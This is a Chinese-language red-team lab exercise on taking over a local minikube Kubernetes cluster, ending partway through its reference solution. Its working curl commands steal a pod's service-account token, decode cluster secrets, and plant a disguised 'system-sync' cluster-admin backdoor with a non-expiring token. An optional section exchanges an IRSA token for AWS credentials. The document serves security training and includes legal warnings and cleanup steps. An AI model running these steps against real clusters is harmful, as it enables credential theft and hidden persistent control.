# 練習 D — K8s 叢集接管：從受害 Pod 到 cluster-admin

> **目標**：親手執行 Kubernetes（K8s）完整攻擊鏈——從受害 Pod 讀取 Service Account（SA）token、枚舉 RBAC 權限、確認 cluster-admin、外洩跨命名空間機密，到建立持久化後門（Shadow SA）與長效 Token。本練習對應 Ch25–30 的 K8s 攻擊系列。

---

## 法律與倫理警告

**在繼續之前，請確認你完全理解以下事項。**

本練習涉及 Kubernetes 叢集接管（cluster takeover）技術，屬於進攻性安全（offensive security）操作。

**嚴格要求**：
- 本練習**只能**在你自己擁有或持有明確書面授權的隔離 lab 環境執行
- 建議環境：本機 minikube、Kind（Kubernetes in Docker）、或個人帳號下的獨立 EKS/GKE 測試叢集
- **禁止**在公司叢集、客戶叢集、任何含有真實工作負載的環境執行

**K8s 攻擊比容器逃逸更具破壞力**：

取得 cluster-admin 後，你能刪除所有 Pod、清空所有 Secret、破壞所有 PersistentVolume。一次誤操作可以讓跑在叢集上的所有服務停擺，資料永久遺失。這不是「讀一個檔案」的等級，是整個叢集的控制權。**在任何你不能承擔後果的環境，絕對不要執行本練習。**

**法律面**：

依據台灣《刑法》：
- 第 358 條：「無故輸入他人帳號密碼、破解使用電腦之保護措施或取得他人電腦之使用權限」，處三年以下有期徒刑
- 第 360 條：「無故以電腦程式或其他電磁方式干擾他人電腦或其相關設備」，處三年以下有期徒刑

在他人 K8s 叢集上建立 ClusterRoleBinding 或竊取 Secret，無論其 RBAC 配置多麼寬鬆，都可能觸犯上述條文。**授權範圍不明確時，先拿到書面授權再動手。**

---

## 情境設定

你是某公司紅隊成員，正在測試一套**已取得書面授權的 lab K8s 叢集**。叢集中有一個刻意配置不當的應用 Pod，其 Service Account 被某位工程師「為了方便」繫結了 `cluster-admin`。你的任務是從這個受害 Pod 出發，示範完整攻擊鏈，讓 DevSecOps 團隊理解 RBAC 過度授權的實際風險。

攻擊路線總覽：

```
受害 Pod（webapp-sa）
  │
  ├─ 讀取 /var/run/secrets/kubernetes.io/serviceaccount/token
  ├─ 解碼 JWT，確認 SA 身份
  ├─ curl API Server，枚舉可執行的操作
  ├─ 確認 cluster-admin → 跨命名空間列舉並外洩 Secret
  ├─ 建立 Shadow SA（system-sync）+ ClusterRoleBinding
  └─ 建立長效 Token → 持久化後門完成
```

本練習分兩條軌道：

| 軌道 | 環境 | 難度 | 說明 |
|------|------|------|------|
| Track A | 本機 minikube + 弱 RBAC | ★★★ | 主線，完整動手驗證 |
| Track B | EKS + IRSA（選做） | ★★★★ | 理論延伸，K8s → AWS 憑證竊取 |

---

## Track A — 本機 minikube 弱 RBAC 環境

### 前置需求

```bash
# 確認 minikube 已安裝
minikube version

# 確認 kubectl 已安裝
kubectl version --client

# 如果 minikube 還沒啟動
minikube start

# 確認叢集正常
kubectl get nodes
# 預期看到一個 Ready 的 node
```

### 建立脆弱環境

以下步驟在你的**本機 host**（不是 Pod 內）執行，用來模擬一個「工程師不小心把 cluster-admin 掛到應用 SA 上」的場景。

```bash
# 建立測試命名空間（namespace）
kubectl create namespace vuln-app

# 建立應用 Service Account
kubectl create serviceaccount webapp-sa -n vuln-app

# 把 cluster-admin 繫結到這個 SA（這就是配置錯誤的那一步）
kubectl create clusterrolebinding webapp-sa-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=vuln-app:webapp-sa

# 部署受害 Pod，使用這個過度授權的 SA
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-pod
  namespace: vuln-app
spec:
  serviceAccountName: webapp-sa
  containers:
  - name: app
    image: busybox
    command: ["/bin/sh", "-c", "sleep 86400"]
EOF

# 在 kube-system 建立模擬的機密資料（供後續外洩演示用）
kubectl create secret generic db-credentials \
  --from-literal=password=super-secret-db-password \
  -n kube-system

# 確認 Pod 已啟動（STATUS 變成 Running 才繼續）
kubectl get pod vulnerable-pod -n vuln-app -w
```

**預期輸出**：

```
NAME             READY   STATUS    RESTARTS   AGE
vulnerable-pod   1/1     Running   0          30s
```

**常見問題**：
- `ErrImagePull` → minikube 無法拉取 `busybox`；改用 `minikube ssh` 後 `docker pull busybox` 預先拉取，或把 image 換成 `alpine`
- `Pending` 超過 2 分鐘 → `kubectl describe pod vulnerable-pod -n vuln-app` 看 Events 欄位，通常是資源不足或 node 未 Ready

---

## 步驟一：進入受害 Pod

**目標**：取得 Pod 的 shell，確認這是一個受限的容器環境——沒有 `kubectl`，沒有完整工具，但 `/var/run/secrets` 目錄存在。

```bash
# 從 host 進入 Pod
kubectl exec -it vulnerable-pod -n vuln-app -- /bin/sh
```

進入後提示符變成 `/ #`，以下**步驟二到步驟六均在 Pod 內執行**。

確認環境：

```bash
# 確認自己在 Pod 內
ls /.dockerenv          # 存在即為容器
cat /proc/1/cgroup      # 路徑含 /kubepods/ 或 /docker/

# 確認沒有 kubectl（攻擊者通常沒有方便的工具）
which kubectl           # 預期: not found

# 確認 SA token 掛載點存在
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

**預期輸出**：

```
# ls /var/run/secrets/kubernetes.io/serviceaccount/
ca.crt     namespace  token
```

這三個檔案是 K8s 自動注入的，任何未停用 `automountServiceAccountToken` 的 Pod 都有。`token` 是 JWT；`ca.crt` 是 API Server 的 CA 憑證，用來驗證 TLS；`namespace` 記錄這個 Pod 所在的命名空間。

**常見問題**：
- `ls: /var/run/secrets/kubernetes.io/serviceaccount/: No such file or directory` → Pod spec 設定了 `automountServiceAccountToken: false`，本練習的 vulnerable-pod 沒有這行，不應發生；確認 Pod 是否正確套用了 spec

---

## 步驟二：讀取 SA Token + 枚舉權限

**目標**：把 token 讀出來，解碼 JWT 的 payload 欄位確認 SA 身份，再用 curl 對 API Server 查詢自身權限。

```bash
# 設定後續 curl 會用到的環境變數
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

echo "Namespace: $NAMESPACE"
echo "Token length: ${#TOKEN}"
```

**預期輸出**：

```
Namespace: vuln-app
Token length: 1234   （實際長度依 K8s 版本而定，通常 800–2000 字元）
```

解碼 JWT payload（JWT 格式是 header.payload.signature，三段以 `.` 分隔，每段 base64url 編碼）：

```bash
# 取出 payload（第二段），base64 解碼
# busybox 的 base64 可能不支援 -d，改用 base64url 對齊處理
echo $TOKEN | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
```

**預期輸出（格式化後節錄）**：

```json
{
  "iss": "kubernetes/serviceaccount",
  "kubernetes.io/serviceaccount/namespace": "vuln-app",
  "kubernetes.io/serviceaccount/secret.name": "webapp-sa-token-xxxxx",
  "kubernetes.io/serviceaccount/service-account.name": "webapp-sa",
  "kubernetes.io/serviceaccount/service-account.uid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "sub": "system:serviceaccounts:vuln-app:webapp-sa",
  "exp": 1790000000
}
```

`sub` 欄位揭露了完整身份：`system:serviceaccounts:<namespace>:<sa-name>`。這就是 K8s API Server 看到這個 token 時識別的身份。

現在確認 API Server 可達，並測試基本的 Pod 列舉權限：

```bash
# 列出 kube-system 的 Pod（確認 API 可通且 token 有效）
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/pods \
  | head -c 300
```

**預期輸出（節錄）**：

```json
{
  "kind": "PodList",
  "apiVersion": "v1",
  "items": [
    {
      "metadata": {
        "name": "coredns-xxxxxxxx-xxxxx",
        "namespace": "kube-system",
```

API 可通，且 token 有效（若 token 無效會回傳 401 Unauthorized）。

用 `SelfSubjectAccessReview` 精確查詢單一操作的授權（不需要亂猜，K8s 提供這個 API 讓 client 自查）：

```bash
# 查詢：我是否能在 kube-system 列出 secrets？
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "resource": "secrets",
        "verb": "list",
        "namespace": "kube-system"
      }
    }
  }'
```

**預期輸出（status.allowed 是關鍵欄位）**：

```json
{
  "kind": "SelfSubjectAccessReview",
  "apiVersion": "authorization.k8s.io/v1",
  "status": {
    "allowed": true,
    "reason": "RBAC: allowed by ClusterRoleBinding \"webapp-sa-admin\" of ClusterRole \"cluster-admin\" to ServiceAccount \"webapp-sa/vuln-app\""
  }
}
```

`allowed: true` 加上 reason 欄位直接告訴你：你被哪條 ClusterRoleBinding 授權，綁到了哪個 ClusterRole。這個 API 端點在真實滲透中非常有用——不需要窮舉，直接問 API Server「我能不能做 X」。

**常見問題**：
- 回傳 `"allowed": false` → 表示你的 SA 沒有 cluster-admin；確認 Step 0 的 ClusterRoleBinding 有建立（在 host 上 `kubectl get clusterrolebinding webapp-sa-admin`）
- 回傳 `401 Unauthorized` → token 可能過期（projected token 預設 1 小時過期）；在 host 重新 `kubectl exec` 進 Pod 後重新讀取 token
- `curl: (60) SSL certificate problem` → 沒有加 `--cacert $CA`，或加了 `-k` 忘了 `--cacert`；用 `-sk` 同時略過驗證錯誤（lab 環境可接受）

---

## 步驟三：確認 cluster-admin + 外洩機密

**目標**：用 cluster-admin 權限列舉所有命名空間的 Secret，並解碼取出 `db-credentials` 的明文密碼。

```bash
# 列出所有命名空間的所有 Secret（跨命名空間需要 cluster 層級的 list 權限）
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets \
  | python3 -m json.tool \
  | grep -E '"name"|"namespace"' \
  | head -40
```

**預期輸出（節錄）**：

```
            "name": "db-credentials",
            "namespace": "kube-system",
            "name": "coredns-token-xxxxx",
            "namespace": "kube-system",
            "name": "default-token-xxxxx",
            "namespace": "default",
```

`db-credentials` 在 `kube-system` 出現。現在讀取並解碼它的 `password` 欄位（Secret 的 data 欄位是 base64 編碼，不是加密）：

```bash
# 讀取 db-credentials 並解碼 password
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets/db-credentials \
  | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
pw = d['data'].get('password', '')
print(base64.b64decode(pw).decode()) if pw else print('password key not found')
"
```

**預期輸出**：

```
super-secret-db-password
```

K8s Secret 的 base64 是**編碼（encoding）不是加密（encryption）**。任何有 `get` 或 `list` Secret 權限的 SA，都能拿到明文。etcd 靜態加密（encryption at rest）能防止 etcd 儲存被直接讀，但阻止不了有 API 存取權的攻擊者。

同場加映：列出所有 ClusterRoleBinding，找出叢集中其他過度授權的 SA：

```bash
# 找出所有繫結 cluster-admin 的 Subject
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for item in d.get('items', []):
    if item.get('roleRef', {}).get('name') == 'cluster-admin':
        subjects = item.get('subjects', [])
        print(f\"Binding: {item['metadata']['name']}\")
        for s in subjects:
            print(f\"  -> {s.get('kind')}: {s.get('namespace', '')}/{s.get('name')}\")
"
```

**預期輸出（節錄）**：

```
Binding: cluster-admin
  -> Group: /system:masters
Binding: webapp-sa-admin
  -> ServiceAccount: vuln-app/webapp-sa
```

這就是 RBAC 審計的核心：把所有 `cluster-admin` 綁定列出來，任何不是 `system:masters` 的綁定都值得質疑。

**常見問題**：
- `python3: command not found` → busybox 預設沒有 python3；改用 `| grep -A5 '"password"'` 手動找 base64 值，再另開一個終端機用 host 的 `echo '<base64值>' | base64 -d` 解碼
- Secret 的 `data` 欄位是 `null` → Secret 是 `stringData` 型別，或是 TLS Secret；本練習用的 `db-credentials` 走的是標準 `Opaque` 型別，`data.password` 必然存在

---

## 步驟四：示範叢集控制（列舉節點）

**目標**：列舉叢集節點，取得節點的 IP 位址與系統資訊，確認已掌握完整叢集視角。

```bash
# 列出所有節點的名稱與狀態
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/nodes \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for node in d.get('items', []):
    name = node['metadata']['name']
    addrs = node.get('status', {}).get('addresses', [])
    ip = next((a['address'] for a in addrs if a['type'] == 'InternalIP'), 'N/A')
    conds = node.get('status', {}).get('conditions', [])
    ready = next((c['status'] for c in conds if c['type'] == 'Ready'), 'Unknown')
    info = node.get('status', {}).get('nodeInfo', {})
    print(f'Node: {name}  IP: {ip}  Ready: {ready}')
    print(f'  OS: {info.get(\"osImage\", \"\")}  Kernel: {info.get(\"kernelVersion\", \"\")}')
    print(f'  Container Runtime: {info.get(\"containerRuntimeVersion\", \"\")}')
"
```

**預期輸出（minikube 單節點）**：

```
Node: minikube  IP: 192.168.49.2  Ready: True
  OS: Ubuntu 22.04.3 LTS  Kernel: 5.15.0-91-generic
  Container Runtime: docker://24.0.7
```

這些資訊在真實滲透中有具體用途：
- `InternalIP` → 後續橫向移動的目標 IP
- `kernelVersion` → 判斷是否存在可利用的 kernel 漏洞
- `containerRuntimeVersion` → 判斷容器運行時的版本，評估逃逸面

**常見問題**：
- 輸出是空的 → `python3 -c` 的縮排用了 tab 和空格混用；直接把整段 python3 指令複製貼上，確保縮排一致

---

## 步驟五：建立持久化後門（Shadow SA）

**目標**：在 `kube-system` 建立一個新的 Service Account（`system-sync`），並給它 `cluster-admin` 權限。即使原本的 `vulnerable-pod` 被刪除，這個後門 SA 持續存在。

從 Ch29 的持久化技術：使用偽裝成系統元件的名稱（`system-sync`），把後門藏在 `kube-system` 命名空間（管理員通常不會仔細看這裡的非原生資源）。

```bash
# 在 kube-system 建立 Shadow SA
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $APISERVER/api/v1/namespaces/kube-system/serviceaccounts \
  -d '{
    "apiVersion": "v1",
    "kind": "ServiceAccount",
    "metadata": {
      "name": "system-sync",
      "namespace": "kube-system"
    }
  }'
```

**預期輸出**：

```json
{
  "kind": "ServiceAccount",
  "apiVersion": "v1",
  "metadata": {
    "name": "system-sync",
    "namespace": "kube-system",
    "uid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "creationTimestamp": "2026-08-01T00:00:00Z"
  }
}
```

建立 ClusterRoleBinding，把 cluster-admin 給這個 Shadow SA：

```bash
# 建立 ClusterRoleBinding（名稱故意選看起來像系統元件的）
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  -d '{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "ClusterRoleBinding",
    "metadata": {
      "name": "system:sync:admin"
    },
    "subjects": [
      {
        "kind": "ServiceAccount",
        "name": "system-sync",
        "namespace": "kube-system"
      }
    ],
    "roleRef": {
      "kind": "ClusterRole",
      "name": "cluster-admin",
      "apiGroup": "rbac.authorization.k8s.io"
    }
  }'
```

**預期輸出**：

```json
{
  "kind": "ClusterRoleBinding",
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "metadata": {
    "name": "system:sync:admin",
    "uid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "creationTimestamp": "2026-08-01T00:00:00Z"
  },
  "subjects": [{"kind": "ServiceAccount", "name": "system-sync", "namespace": "kube-system"}],
  "roleRef": {"kind": "ClusterRole", "name": "cluster-admin", "apiGroup": "rbac.authorization.k8s.io"}
}
```

**持久化的關鍵邏輯**：`ClusterRoleBinding` 是 cluster 層級資源，它的生命週期和任何 Pod 無關。刪除 `vulnerable-pod`、刪除 `vuln-app` namespace、甚至重新部署整個應用——只要 `system:sync:admin` 這個 ClusterRoleBinding 沒被刪，`system-sync` SA 就保持 cluster-admin。防守方如果不審計 `kube-system` 的非原生 SA，不會注意到這個後門。

**常見問題**：
- 回傳 `409 Conflict` → 這個名稱已存在；改名或先刪掉既有的（`kubectl delete clusterrolebinding system:sync:admin`）再重建
- 回傳 `403 Forbidden` → SA 沒有 `create` clusterrolebindings 的權限；確認步驟二的 `SelfSubjectAccessReview` 回傳 `allowed: true`

---

## 步驟六：取得長效 Token

**目標**：為 Shadow SA 建立一個長效 Token（`kubernetes.io/service-account-token` 型別的 Secret），取得這個 Token 後即可在 Pod 之外使用 kubectl 或 curl 以 cluster-admin 身份操作叢集。

從 Ch29：K8s 1.22 之後預設不再自動建立 SA 的 Secret-based token，projected token 改為短效（預設 1 小時）。但 API Server 仍允許手動建立 `kubernetes.io/service-account-token` 型別的 Secret，這種 Secret 的 token **沒有過期時間**，除非 SA 被刪除或 Secret 被手動撤銷。

```bash
# 為 system-sync 建立長效 Token Secret
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $APISERVER/api/v1/namespaces/kube-system/secrets \
  -d '{
    "apiVersion": "v1",
    "kind": "Secret",
    "metadata": {
      "name": "system-sync-token",
      "namespace": "kube-system",
      "annotations": {
        "kubernetes.io/service-account.name": "system-sync"
      }
    },
    "type": "kubernetes.io/service-account-token"
  }'
```

**預期輸出**：

```json
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "system-sync-token",
    "namespace": "kube-system",
    "annotations": {
      "kubernetes.io/service-account.name": "system-sync"
    }
  },
  "type": "kubernetes.io/service-account-token",
  "data": {}
}
```

注意 `data` 目前是空的——K8s 的 Token Controller 需要幾秒鐘填入 token 欄位。等待後讀取：

```bash
# 等 Token Controller 填入 token（通常 3–10 秒）
sleep 10

# 讀取並解碼 token
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets/system-sync-token \
  | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
data = d.get('data', {})
token = data.get('token', '')
if token:
    print('=== BACKDOOR TOKEN ===')
    print(base64.b64decode(token).decode())
    print('=== END ===')
else:
    print('Token not populated yet, wait a few more seconds and retry')
"
```

**預期輸出**：

```
=== BACKDOOR TOKEN ===
eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50IiwKImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvbmFtZXNwYWNlIjoia3ViZS1zeXN0ZW0iLAoia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InN5c3RlbS1zeW5jLXRva2VuIiwKImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJzeXN0ZW0tc3luYyIsC...（後略）
=== END ===
```

取得這個 token 後，攻擊者可以離開 Pod，在任何地方用這個 token 呼叫叢集 API。從 host 驗證這個 token 確實有效：

```bash
# 退出 Pod（輸入 exit 或按 Ctrl-D）
exit

# 在 host 上，用取得的 backdoor token 呼叫 API（把 <TOKEN> 換成上面拿到的）
BACKDOOR_TOKEN="<貼上上面取得的 token>"
APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')

curl -sk \
  -H "Authorization: Bearer $BACKDOOR_TOKEN" \
  $APISERVER/api/v1/nodes \
  | python3 -m json.tool | grep '"name"' | head -5
```

**預期輸出**：

```
"name": "minikube",
```

即使 `vulnerable-pod` 已不存在，backdoor token 仍然有效。

**常見問題**：
- `sleep 10` 後 token 仍為空 → Token Controller 可能尚未處理；再等 10 秒後重新執行 curl 讀取指令
- 從 host 用 backdoor token 呼叫 API 時收到 `x509: certificate signed by unknown authority` → 用 `-sk` 或加上 `--cacert`（ca.crt 可從 minikube 取得：`kubectl config view --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' | base64 -d > /tmp/ca.crt`）

---

## Track B — EKS + IRSA 擴充（選做）

**本段為理論延伸，未在真實 EKS 環境動手驗證，為預期行為描述。** 需要你自己的 EKS 叢集且已設定 IRSA（IAM Roles for Service Accounts）。

### 背景：IRSA 的運作機制

IRSA 讓 K8s SA 能透過 OIDC 聯合（federation）取得 AWS IAM Role 的臨時憑證（STS 短效 token）。流程：

1. Pod 的 SA 有 `eks.amazonaws.com/role-arn` annotation
2. Pod 掛載了一個 projected token，audience 是 `sts.amazonaws.com`（路徑：`/var/run/secrets/eks.amazonaws.com/serviceaccount/token`）
3. 應用呼叫 `aws sts assume-role-with-web-identity`，傳入這個 token 與 Role ARN
4. STS 驗證 token 簽章（透過 EKS OIDC Provider）後回傳 `AccessKeyId`/`SecretAccessKey`/`SessionToken`

如果攻擊者取得了一個有 IRSA 的 Pod 的 SA，就能同時取得 K8s cluster-admin 和 AWS 帳號存取權。

### 如何識別 IRSA Pod

在有 IRSA 的環境，從 Pod 內確認：

```bash
# 確認有 AWS 環境變數（IRSA 自動注入）
env | grep -E 'AWS_ROLE_ARN|AWS_WEB_IDENTITY_TOKEN_FILE'
```

**預期輸出（若有 IRSA）**：

```
AWS_ROLE_ARN=arn:aws:iam::123456789012:role/MyEksAppRole
AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
```

### 提取 IRSA Token 並換取 AWS 憑證

```bash
# 讀取 IRSA projected token（這個 token 的 audience 是 sts.amazonaws.com，不是 API Server）
IRSA_TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
ROLE_ARN=$AWS_ROLE_ARN

# 解碼確認 audience
echo $IRSA_TOKEN | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool

# 呼叫 STS 換取 AWS 臨時憑證
curl -s "https://sts.amazonaws.com/" \
  --data-urlencode "Action=AssumeRoleWithWebIdentity" \
  --data-urlencode "Version=2011-06-15" \
  --data-urlencode "RoleArn=$ROLE_ARN" \
  --data-urlencode "RoleSessionName=eks-attack" \
  --data-urlencode "WebIdentityToken=$IRSA_TOKEN"
```

**預期輸出（成功時）**：

```xml
<AssumeRoleWithWebIdentityResponse>
  <AssumeRoleWithWebIdentityResult>
    <Credentials>
      <AccessKeyId>ASIA...</AccessKeyId>
      <SecretAccessKey>...</SecretAccessKey>
      <SessionToken>...</SessionToken>
      <Expiration>2026-08-01T01:00:00Z</Expiration>
    </Credentials>
  </AssumeRoleWithWebIdentityResult>
</AssumeRoleWithWebIdentityResponse>
```

取得這三個值後，設定為環境變數，即可在 Pod 內直接呼叫 AWS API：

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# 需要 aws cli（容器內可能沒有；用 curl 直接打 AWS API 也可）
# 查詢當前身份
curl -s "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15" \
  # （AWS SigV4 簽章較複雜，實際測試建議安裝 aws-cli）
```

### 常見錯誤情境

**Token audience 不符**：

```
<Error>
  <Code>InvalidIdentityToken</Code>
  <Message>Incorrect token audience</Message>
</Error>
```

原因：IRSA projected token 的 audience 必須是 `sts.amazonaws.com`。如果你把 K8s SA 的一般 token（audience 是 `https://kubernetes.default.svc`）傳給 STS，就會收到這個錯誤。兩種 token 路徑不同，不能互換。

**SA 無 IRSA annotation**：

若 SA 沒有 `eks.amazonaws.com/role-arn` annotation，Pod 不會掛載 IRSA token，`AWS_ROLE_ARN` 環境變數也不存在。這種情況只能走 K8s 側的攻擊，無法直接取得 AWS 憑證（但 node 的 EC2 Instance Profile 可能另有機會，需要從 node escape 路線處理）。

---

## 邊界案例與失敗分析

### 案例一：Projected Token 過期

K8s 1.20+ 的 Pod 預設使用 projected service account token，有效期預設 1 小時（`--service-account-token-max-expiration`）。

**現象**：

```json
{
  "kind": "Status",
  "apiVersion": "v1",
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

**診斷**：

```bash
# 解碼 token 的 exp 欄位（Unix timestamp）
echo $TOKEN | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('exp:', d.get('exp'))"

# 對比當前時間
python3 -c "import time; print('now:', int(time.time()))"
```

若 `exp` 小於 `now`，token 已過期。解法：退出 Pod 後重新 `kubectl exec` 進去，Kubelet 會在 token 過期前自動 rotate，你重新讀 `/var/run/secrets/.../token` 就能取到新的有效 token。

### 案例二：SA 只有命名空間層級權限

如果 SA 只有 `vuln-app` namespace 的 Role，而非 ClusterRole：

```bash
# 嘗試列出 kube-system 的 secrets
curl -sk --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets
```

**現象**：

```json
{
  "kind": "Status",
  "status": "Failure",
  "message": "secrets is forbidden: User \"system:serviceaccount:vuln-app:webapp-sa\" cannot list resource \"secrets\" in API group \"\" in the namespace \"kube-system\"",
  "reason": "Forbidden",
  "code": 403
}
```

`Forbidden`（403）和 `Unauthorized`（401）的差別：403 表示 API Server 識別了你的身份，但你沒有做這件事的授權；401 表示身份驗證失敗（token 無效或過期）。

命名空間層級的 SA 只有該 namespace 的操作權限，無法跨命名空間讀取 Secret，無法列舉節點，無法建立 ClusterRoleBinding。這是正確的最小權限設計。

### 案例三：IRSA Token Audience 不符

已在 Track B 錯誤情境節說明。根本原因：STS 的 `AssumeRoleWithWebIdentity` 驗證 token 的 `aud` claim 必須包含 `sts.amazonaws.com`；K8s SA token 的 `aud` 是叢集的 API Server URL。這兩個 token 由不同的 projected volume source 提供，路徑不同，用途不同。

---

## 環境清理

**練習結束後，務必清除所有建立的資源。** 特別注意 `system:sync:admin` ClusterRoleBinding——如果忘記刪除，這個後門在叢集上永久存在。

```bash
# 在 host 上執行以下所有清理指令

# 移除受害 Pod
kubectl delete pod vulnerable-pod -n vuln-app --grace-period=0 --force 2>/dev/null || true

# 移除 webapp-sa 的 cluster-admin 綁定（原始配置錯誤）
kubectl delete clusterrolebinding webapp-sa-admin 2>/dev/null || true

# 移除 Shadow SA 的 cluster-admin 綁定（持久化後門）
kubectl delete clusterrolebinding "system:sync:admin" 2>/dev/null || true

# 移除 webapp-sa
kubectl delete serviceaccount webapp-sa -n vuln-app 2>/dev/null || true

# 移除 Shadow SA
kubectl delete serviceaccount system-sync -n kube-system 2>/dev/null || true

# 移除長效 Token Secret
kubectl delete secret system-sync-token -n kube-system 2>/dev/null || true

# 移除模擬機密資料
kubectl delete secret db-credentials -n kube-system 2>/dev/null || true

# 移除測試命名空間（會連帶刪除裡面所有資源）
kubectl delete namespace vuln-app 2>/dev/null || true

# 確認清理完成
echo "=== 確認沒有殘留資源 ==="
kubectl get clusterrolebinding | grep -E "webapp-sa|system:sync" || echo "ClusterRoleBindings: 已清除"
kubectl get sa -n kube-system | grep "system-sync" || echo "Shadow SA: 已清除"
kubectl get secret -n kube-system | grep "system-sync" || echo "Backdoor Token: 已清除"
kubectl get secret -n kube-system | grep "db-credentials" || echo "db-credentials: 已清除"
kubectl get namespace | grep "vuln-app" || echo "vuln-app namespace: 已清除"
```

---

## 自我檢核

完成練習後，確認你能回答或示範以下每一項：

- [ ] 能從 `/var/run/secrets/kubernetes.io/serviceaccount/token` 讀出 JWT，並手動解碼 payload 取出 `sub`（SA 身份）與 `exp`（過期時間）
- [ ] 能在不使用 `kubectl` 的情況下，用 curl + Bearer token 對 API Server 發出請求並列出資源
- [ ] 能用 `SelfSubjectAccessReview` API 查詢自身在特定 namespace 的特定操作是否被授權，並解讀 `status.allowed` 和 `status.reason`
- [ ] 能用 cluster-admin token 列出所有命名空間的 Secret，並 base64 解碼取得明文值
- [ ] 能解釋為什麼 K8s Secret 的 base64 encoding 不是安全保護
- [ ] 成功建立 Shadow SA（`system-sync`）與對應的 `ClusterRoleBinding`，並能解釋為什麼刪除原始 Pod 後後門依然存在
- [ ] 成功建立 `kubernetes.io/service-account-token` 型別的 Secret，取得沒有過期時間的長效 Token
- [ ] 能解釋長效 Token 和 projected token 的差異（過期時間、撤銷方式）
- [ ] 練習結束後確認已刪除所有建立的資源，特別是 `system:sync:admin` ClusterRoleBinding
- [ ] （選做）能解釋 IRSA 的 token 交換流程，以及為什麼 K8s SA token 無法直接用於 STS

---

## 參考解答

**先跑完整個攻擊鏈，遇到的錯誤自己除錯，再來看解答。** 光看指令不會讓你學會 K8s 攻擊；只有在某個步驟收到 403、401、或空回應，花時間診斷後才會有印象。

<details>
<summary>點開參考解答 — 完整攻擊鏈與機制解釋</summary>

### 完整指令流程（含預期輸出）

```bash
# ===== Host 端：環境建立 =====

minikube start
kubectl create namespace vuln-app
kubectl create serviceaccount webapp-sa -n vuln-app
kubectl create clusterrolebinding webapp-sa-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=vuln-app:webapp-sa

kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-pod
  namespace: vuln-app
spec:
  serviceAccountName: webapp-sa
  containers:
  - name: app
    image: busybox
    command: ["/bin/sh", "-c", "sleep 86400"]
EOF

kubectl create secret generic db-credentials \
  --from-literal=password=super-secret-db-password \
  -n kube-system

kubectl get pod vulnerable-pod -n vuln-app
# NAME             READY   STATUS    RESTARTS   AGE
# vulnerable-pod   1/1     Running   0          45s

# ===== 進入 Pod =====

kubectl exec -it vulnerable-pod -n vuln-app -- /bin/sh

# ===== Pod 內：步驟一 — 確認環境 =====

ls /var/run/secrets/kubernetes.io/serviceaccount/
# ca.crt  namespace  token

